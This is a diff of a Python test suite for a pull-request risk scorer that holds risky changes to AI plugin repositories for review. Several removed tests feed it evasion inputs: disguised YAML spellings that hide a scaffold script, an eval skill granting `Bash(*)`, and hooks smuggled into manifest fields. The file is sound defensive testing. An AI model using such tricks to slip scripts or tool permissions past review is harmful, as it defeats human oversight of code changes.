+
+    def test_a_path_or_size_med_merges(self):
+        for changes in (
+            dict(files=(_file("plugins/foo/logo.png", has_patch=False),)),
+            dict(files=(_file("plugins/foo/a.md", additions=500),)),
+            dict(work_class="C3", rung=Rung.C3, blast_radius=None),
+            dict(files=(_file("plugins/foo/a.md"), _file("plugins/bar/b.md"))),
+        ):
+            with self.subTest(changes=changes):
+                result = score(_input(**changes))
+                self.assertEqual(result.score, Risk.MED)
+                self.assertFalse(holds(result), result.reasons)
+
+    def test_an_open_review_finding_holds(self):
+        lanes = (
+            _lane("claude-review", open_findings=1),
+            _lane("claude-security-review"),
         )
-        files = (manifest, _file("plugins/foo/scripts/run.sh"))
-        codes = _codes(score(_input(files=files)))
-        self.assertIn("high-path:plugins/*/scripts/**", codes)
-        self.assertNotIn(self.REVIEW, codes)
+        files = (_file("plugins/foo/logo.png", has_patch=False),)
+        self.assertTrue(self._holds(lanes=lanes, files=files))
 
-
-def _with(base, **keys):
-    """`base` with each key set to its JSON value, or removed when None."""
-    data = json.loads(base)
-    for key, value in keys.items():
-        if value is None:
-            data.pop(key, None)
-        else:
-            data[key] = value
-    return json.dumps(data)
-
-
-def _option(**attrs):
-    data = json.loads(PLUGIN_BASE)
-    data["userConfig"]["guard_enabled"].update(attrs)
-    for key, value in attrs.items():
-        if value is None:
-            del data["userConfig"]["guard_enabled"][key]
-    return json.dumps(data)
-
-
-def _entry(**attrs):
-    data = json.loads(MARKET_BASE)
-    data["plugins"][0].update(attrs)
-    for key, value in attrs.items():
-        if value is None:
-            del data["plugins"][0][key]
-    return json.dumps(data)
-
-
-class ManifestAllowListTests(unittest.TestCase):
-    """Only listed keys may differ; every other difference holds, naming the
-    key that triggered it."""
-
-    REVIEW = "manifest-review-required"
-
-    def _detail(self, path, before, after):
-        result = score(_input(files=(_manifest_change(path, before, after),)))
-        return {r.code: r.detail for r in result.reasons}
-
-    def test_listed_plugin_keys_clear(self):
-        for after in (
-            _with(PLUGIN_BASE, version="2.0.0"),
-            _with(PLUGIN_BASE, description="Other."),
-            _with(PLUGIN_BASE, keywords=["a"]),
-            _with(PLUGIN_BASE, author={"name": "a"}),
-            _with(PLUGIN_BASE, homepage="https://example.com"),
-            _with(PLUGIN_BASE, repository="https://example.com/r"),
-            _with(PLUGIN_BASE, license="MIT"),
-            _with(PLUGIN_BASE, description=None),
-            _option(title="Guard"),
-            _option(description="Turns the guard on."),
-        ):
-            with self.subTest(after=after):
-                self.assertEqual(self._detail(MANIFEST, PLUGIN_BASE, after), {})
-
-    def test_an_added_user_config_key_holds(self):
-        def add(entry):
-            data = json.loads(PLUGIN_BASE)
-            data["userConfig"]["mode"] = entry
-            return json.dumps(data)
-
-        for entry in (
-            {"type": "string", "default": "x"},
-            {"type": "string"},
-            {"type": "string", "default": "a", "options": ["a", "b"]},
-            "x",
-        ):
-            with self.subTest(entry=entry):
-                detail = self._detail(MANIFEST, PLUGIN_BASE, add(entry))
-                self.assertIn("userConfig.mode added", detail.get(self.REVIEW, ""))
-
-    def test_each_unlisted_plugin_change_holds_and_names_its_key(self):
-        for after, named in (
-            (_with(PLUGIN_BASE, skills=["./evals/skills/"]), "skills"),
-            (_with(PLUGIN_BASE, commands=["./docs/run.md"]), "commands"),
-            (_with(PLUGIN_BASE, agents=["./x/"]), "agents"),
-            (_with(PLUGIN_BASE, outputStyles="./styles/"), "outputStyles"),
-            (_with(PLUGIN_BASE, channels=[{"server": "x"}]), "channels"),
-            (_with(PLUGIN_BASE, settings={"agent": "x"}), "settings"),
-            (_with(PLUGIN_BASE, somethingNew=True), "somethingNew"),
-            (_with(PLUGIN_BASE, name="bar"), "name"),
-            (_with(PLUGIN_BASE, defaultEnabled=False), "defaultEnabled"),
-            (_with(PLUGIN_BASE, version=None), "version removed"),
-            (_with(PLUGIN_BASE, userConfig=[]), "userConfig is not an object"),
-            (_with(PLUGIN_BASE, userConfig={}), "userConfig.guard_enabled removed"),
-            (_option(sensitive=True), "userConfig.guard_enabled.sensitive"),
-            (_option(type="string"), "userConfig.guard_enabled.type"),
-            (_option(default=False), "userConfig.guard_enabled.default"),
-            (_option(options=[True, False]), "userConfig.guard_enabled.options"),
-            (_option(required=True), "userConfig.guard_enabled.required"),
+    def test_an_unbound_or_missing_lane_holds(self):
+        for lanes in (
             (
-                _with(PLUGIN_BASE, userConfig={"guard_enabled": True}),
-                "userConfig.guard_enabled is not an object",
+                _lane("claude-review", bound=False, unbound_reason="no-run"),
+                _lane("claude-security-review"),
             ),
+            (_lane("claude-review"),),
         ):
-            with self.subTest(named):
-                detail = self._detail(MANIFEST, PLUGIN_BASE, after)
-                self.assertIn(named, detail.get(self.REVIEW, ""))
+            with self.subTest(lanes=lanes):
+                self.assertTrue(self._holds(lanes=lanes))
 
-    def test_a_sensitive_option_turned_off_holds(self):
-        before = _option(sensitive=True)
-        after = _option(sensitive=False)
-        detail = self._detail(MANIFEST, before, after)
-        self.assertIn("userConfig.guard_enabled.sensitive", detail.get(self.REVIEW, ""))
-
-    def test_a_skills_path_to_eval_data_holds_with_the_eval_skill(self):
-        manifest = _manifest_change(
-            MANIFEST, PLUGIN_BASE, _with(PLUGIN_BASE, skills=["./evals/skills/"])
-        )
-        skill = _edit(
-            "plugins/foo/evals/skills/y/SKILL.md",
-            FRONT,
-            FRONT.replace("y\n", "y\nallowed-tools: Bash(*)\n", 1),
-        )
-        result = score(_input(files=(manifest, skill), eval_cases=()))
-        self.assertEqual(result.score, Risk.HIGH)
-        self.assertIn(self.REVIEW, _codes(result))
-
-    def test_listed_marketplace_changes_clear(self):
-        for after in (
-            _entry(version="2.0.0"),
-            _entry(description="Foo."),
-            _entry(keywords=["a"]),
-            _entry(author={"name": "a"}),
-            _entry(homepage="https://example.com"),
-            _entry(repository="https://example.com/r"),
-            _entry(license="MIT"),
-            _entry(category="tools"),
-            _entry(tags=["a"]),
-            _with(MARKET_BASE, metadata={"description": "M.", "version": "1.0.0"}),
-        ):
-            with self.subTest(after=after):
-                self.assertEqual(self._detail(MARKETPLACE, MARKET_BASE, after), {})
-
-    def test_each_unlisted_marketplace_change_holds_and_names_its_key(self):
-        versioned = _entry(version="1.0.0")
-        two = MARKET_BASE.replace(
-            "]}", ', {"name": "bar", "source": "./plugins/bar"}]}'
-        )
-        for before, after, named in (
-            (MARKET_BASE, _entry(strict=False), "plugins[foo].strict"),
-            (MARKET_BASE, _entry(skills=["./x/"]), "plugins[foo].skills"),
-            (MARKET_BASE, _entry(source="./plugins/x"), "plugins[foo].source"),
-            (versioned, MARKET_BASE, "plugins[foo].version removed"),
-            (two, MARKET_BASE, "plugins[bar] removed"),
-            (MARKET_BASE, two, "plugins[bar] added"),
-            (MARKET_BASE, _entry(name="foo2"), "plugins[foo] removed"),
-            (MARKET_BASE, _with(MARKET_BASE, owner={"name": "x"}), "owner"),
-            (MARKET_BASE, _with(MARKET_BASE, name="n"), "name"),
-            (
-                MARKET_BASE,
-                _with(MARKET_BASE, metadata={"pluginRoot": "./x"}),
-                "metadata.pluginRoot",
-            ),
-            (MARKET_BASE, _with(MARKET_BASE, metadata=[]), "metadata is not an object"),
-            (MARKET_BASE, _with(MARKET_BASE, plugins={}), "plugins is not a list"),
-            (
-                MARKET_BASE,
-                two.replace('"bar"', '"foo"'),
-                "plugins is not a list of uniquely named entries",
-            ),
-        ):
-            with self.subTest(named):
-                detail = self._detail(MARKETPLACE, before, after)
-                self.assertIn(named, detail.get(self.REVIEW, ""))
-
-
-class ManifestTypeTests(unittest.TestCase):
-    """A listed key clears only with the type it should have, and values are
-    compared as JSON, so `false` and `0` differ."""
-
-    REVIEW = "manifest-review-required"
-
-    def _detail(self, path, before, after):
-        result = score(_input(files=(_manifest_change(path, before, after),)))
-        return {r.code: r.detail for r in result.reasons}.get(self.REVIEW, "")
-
-    def test_a_listed_plugin_key_of_the_wrong_type_holds(self):
-        for key, value in (
-            ("homepage", {"hooks": {"Stop": []}}),
-            ("version", {"hooks": {}}),
-            ("license", 123),
-            ("description", ["x"]),
-            ("repository", {"url": "x"}),
-            ("keywords", ["a", 1]),
-            ("keywords", "a"),
-            ("author", {"name": 1}),
-            ("author", ["a"]),
-        ):
-            with self.subTest(key=key, value=value):
-                after = _with(PLUGIN_BASE, **{key: value})
-                detail = self._detail(MANIFEST, PLUGIN_BASE, after)
-                self.assertIn(f"{key} has the wrong type", detail)
-
-    def test_a_listed_marketplace_key_of_the_wrong_type_holds(self):
-        for after, named in (
-            (_entry(category=1), "plugins[foo].category"),
-            (_entry(tags="a"), "plugins[foo].tags"),
-            (_entry(homepage={"hooks": {}}), "plugins[foo].homepage"),
-            (_with(MARKET_BASE, metadata={"description": {}}), "metadata.description"),
-        ):
-            with self.subTest(named):
-                detail = self._detail(MARKETPLACE, MARKET_BASE, after)
-                self.assertIn(f"{named} has the wrong type", detail)
-
-    def test_a_default_changed_between_bool_and_number_holds(self):
-        for before, after in ((False, 0), (1, True)):
-            with self.subTest(before=before, after=after):
-                detail = self._detail(
-                    MANIFEST, _option(default=before), _option(default=after)
-                )
-                self.assertIn("userConfig.guard_enabled.default", detail)
-
-    def test_listed_keys_of_the_right_type_clear(self):
-        for key, value in (
-            ("author", "A"),
-            ("author", {"name": "A", "email": "a@example.com"}),
-            ("keywords", []),
-        ):
-            with self.subTest(key=key):
-                after = _with(PLUGIN_BASE, **{key: value})
-                self.assertEqual(self._detail(MANIFEST, PLUGIN_BASE, after), "")
-
-
-class EvalScriptTests(unittest.TestCase):
-    """A script anywhere under plugins/<plugin>/evals/ holds, floor or not:
-    a scaffold may source it outside the sandbox."""
-
-    CODE = "eval-scaffold-review-required"
-
-    def test_a_script_under_evals_holds_in_any_plugin(self):
-        for name in ("x.sh", "x.bash", "x.py", "x.mjs", "x.js", "x.cjs", "x.PS1"):
-            for floor in (True, False):
-                path = f"plugins/animation/evals/fixtures/{name}"
-                with self.subTest(path=path, floor=floor):
-                    inp = _input(files=(_file(path),), eval_cases=(), high_floor=floor)
-                    self.assertIn(self.CODE, _codes(score(inp)))
-
-    def test_an_executable_file_under_evals_holds(self):
-        changed = _file("plugins/animation/evals/fixtures/seed", mode="100755")
-        self.assertIn(self.CODE, _codes(score(_input(files=(changed,), eval_cases=()))))
-
-    def test_a_script_renamed_out_of_evals_holds(self):
-        moved = _file(
-            "plugins/animation/notes/x.txt",
-            status="renamed",
-            previous_path="plugins/animation/evals/fixtures/x.sh",
-        )
-        self.assertIn(self.CODE, _codes(score(_input(files=(moved,), eval_cases=()))))
-
-    def test_data_beside_a_shared_script_is_low(self):
-        result = score(
-            _input(
-                files=(_file("plugins/animation/evals/fixtures/x.json"),), eval_cases=()
+    def test_the_cost_hold_and_high_hold(self):
+        patch = "@@ -1,1 +1,1 @@\n-  max-in-flight: 5\n+  max-in-flight: 50"
+        self.assertTrue(
+            self._holds(
+                files=(_file("docs/conventions/pr-pipeline.yaml", patch=patch),)
             )
         )
-        self.assertEqual(result.score, Risk.LOW, _codes(result))
+        self.assertTrue(self._holds(files=(_file(".gitmodules"),)))
 
-
-CASE_DIR = "plugins/foo/evals/case"
-CASE = f"{CASE_DIR}/case.yaml"
-PLAIN_CASE = 'schema_version: "1.1"\nname: case\n'
-SAFE_CASE = PLAIN_CASE + "context:\n  history_file: h.jsonl\n  add_dirs:\n    - data\n"
-SCAFFOLD_CASE = PLAIN_CASE + "context:\n  scaffold_script: scaffold.sh\n"
-
-
-class EvalScaffoldTests(unittest.TestCase):
-    """A changed file in an eval case directory whose case.yaml could name a
-    scaffold script holds, failing closed when the case file is unread."""
-
-    CODE = "eval-scaffold-review-required"
-
-    def _codes(self, files, eval_cases=()):
-        return _codes(score(_input(files=files, eval_cases=eval_cases)))
-
-    def test_a_scaffold_script_added_or_changed_holds(self):
-        other = SCAFFOLD_CASE.replace("scaffold.sh", "setup.txt")
-        for before, after in (
-            (PLAIN_CASE, SCAFFOLD_CASE),
-            (SAFE_CASE, SAFE_CASE + "  scaffold_script: setup.txt\n"),
-            (SCAFFOLD_CASE, other),
-            (SCAFFOLD_CASE, PLAIN_CASE),
+    def test_the_rung_and_an_unread_listing_hold(self):
+        for changes in (
+            dict(work_class=None),
+            dict(rung=Rung.OFF),
+            dict(work_class="C3", blast_radius="low"),
+            dict(files_complete=False),
         ):
-            with self.subTest(after=after):
-                codes = self._codes((_edit(CASE, before, after),))
-                self.assertEqual(codes, (self.CODE,))
-        added = _file(CASE, status="added", previous_mode=None, contents=(None, other))
-        self.assertEqual(self._codes((added,)), (self.CODE,))
+            with self.subTest(changes=changes):
+                self.assertTrue(self._holds(**changes))
 
-    def test_any_file_in_a_scaffolded_case_holds(self):
-        for path in (
-            f"{CASE_DIR}/setup.txt",
-            f"{CASE_DIR}/setup.bash",
-            f"{CASE_DIR}/scaffold.sh",
-            f"{CASE_DIR}/graders/a.md",
-        ):
-            with self.subTest(path):
-                codes = self._codes((_file(path),), ((CASE, SCAFFOLD_CASE),))
-                self.assertIn(self.CODE, codes)
 
-    def test_a_file_in_an_unscaffolded_case_is_low(self):
-        for eval_cases in ((), ((CASE, PLAIN_CASE),), ((CASE, SAFE_CASE),)):
-            with self.subTest(eval_cases=eval_cases):
-                result = score(
-                    _input(
-                        files=(_file(f"{CASE_DIR}/setup.txt"),), eval_cases=eval_cases
-                    )
-                )
-                self.assertEqual(result.score, Risk.LOW, _codes(result))
-        safe = _edit(CASE, PLAIN_CASE, SAFE_CASE)
-        added = _file(
-            CASE, status="added", previous_mode=None, contents=(None, SAFE_CASE)
-        )
-        for changed in (safe, added):
-            with self.subTest(changed.status):
-                self.assertEqual(self._codes((changed,)), ())
+class SecurityBlockingTests(unittest.TestCase):
+    """The security lane holds only on its CRITICAL findings
+    (`blocking_findings`); claude-review holds on every open finding."""
 
-    def test_a_case_file_that_could_hide_a_scaffold_holds(self):
-        for text in (
-            PLAIN_CASE + 'context:\n  "scaffold_script": s.txt\n',
-            PLAIN_CASE + 'context:\n  "\\x73caffold_script": s.txt\n',
-            PLAIN_CASE + "context: {scaffold_script: s.txt}\n",
-            PLAIN_CASE + "context:\n  other: x\n",
-            PLAIN_CASE + "context:\n  add_dirs: [a,\n    b]\n",
-            PLAIN_CASE + "base: &b\n  scaffold_script: s.txt\ncontext:\n  <<: *b\n",
-            PLAIN_CASE + "context:\n  ? scaffold_script\n  : s.txt\n",
-            PLAIN_CASE + "Context:\n  history_file: h\n",
-            "{context: {scaffold_script: s.txt}}\n",
+    def _security(self, open_findings, blocking):
+        lane = LaneEvidence(
+            "claude-security-review",
+            True,
             None,
-        ):
-            with self.subTest(text=text):
-                codes = self._codes((_file(f"{CASE_DIR}/setup.txt"),), ((CASE, text),))
-                self.assertEqual(codes, (self.CODE,))
-
-    def test_an_unread_case_file_holds(self):
-        unreadable = dataclasses.replace(
-            _edit(CASE, PLAIN_CASE, PLAIN_CASE), contents=None, contents_error="502"
+            open_findings,
+            blocking_findings=blocking,
         )
-        for files, eval_cases in (
-            ((_file(f"{CASE_DIR}/setup.txt"),), None),
-            ((_file(f"{CASE_DIR}/setup.txt"),), (("bad",),)),
-            ((unreadable,), ()),
-            ((_file(CASE, contents=None),), ()),
-        ):
-            with self.subTest(files=files, eval_cases=eval_cases):
-                self.assertEqual(self._codes(files, eval_cases), (self.CODE,))
+        return score(_input(lanes=(_lane("claude-review"), lane)))
 
-    def test_a_file_below_a_scaffolded_case_or_a_removed_case_file_holds(self):
-        deep = _file(f"{CASE_DIR}/fixtures/sub/setup.txt")
-        self.assertIn(self.CODE, self._codes((deep,), ((CASE, SCAFFOLD_CASE),)))
-        removed = _file(CASE, status="removed", contents=None)
-        self.assertIn(self.CODE, self._codes((removed,), ((CASE, SCAFFOLD_CASE),)))
+    def test_a_non_critical_security_finding_adds_no_reason(self):
+        self.assertEqual(self._security(3, 0).reasons, ())
 
-    def test_any_spelling_of_the_case_file_or_evals_counts(self):
-        added = dict(status="added", previous_mode=None)
-        for case, other in (
-            ("plugins/review/evals/new/CASE.YAML", "plugins/review/evals/new/fixture"),
-            ("plugins/foo/evals/new/Case.Yaml", "plugins/foo/evals/new/fixture"),
-            ("plugins/foo/EVALS/new/case.yaml", "plugins/foo/EVALS/new/fixture"),
-        ):
-            files = (
-                _file(case, contents=(None, SCAFFOLD_CASE), **added),
-                _file(other, contents=(None, "echo"), **added),
-            )
-            with self.subTest(case=case, side="diff"):
-                reasons = {
-                    r.code: r.detail
-                    for r in score(_input(files=files, eval_cases=())).reasons
-                }
-                self.assertIn(other, reasons.get(self.CODE, ""))
-            with self.subTest(case=case, side="base"):
-                codes = self._codes((_file(other),), ((case, SCAFFOLD_CASE),))
-                self.assertIn(self.CODE, codes)
+    def test_a_critical_security_finding_is_high(self):
+        result = self._security(3, 1)
+        self.assertEqual(result.score, Risk.HIGH)
+        self.assertEqual(_codes(result), ("security-finding",))
 
-    def test_a_file_outside_plugin_evals_takes_no_scaffold_hold(self):
-        path = "plugins/foo/skills/x/evals/case/setup.txt"
-        self.assertNotIn(self.CODE, _codes(score(_input(files=(_file(path),)))))
-
-
-if __name__ == "__main__":
-    unittest.main()
+    def test_no_severity_count_holds_on_every_finding(self):
+        self.assertEqual(_codes(self._security(2, None)), ("security-finding",))
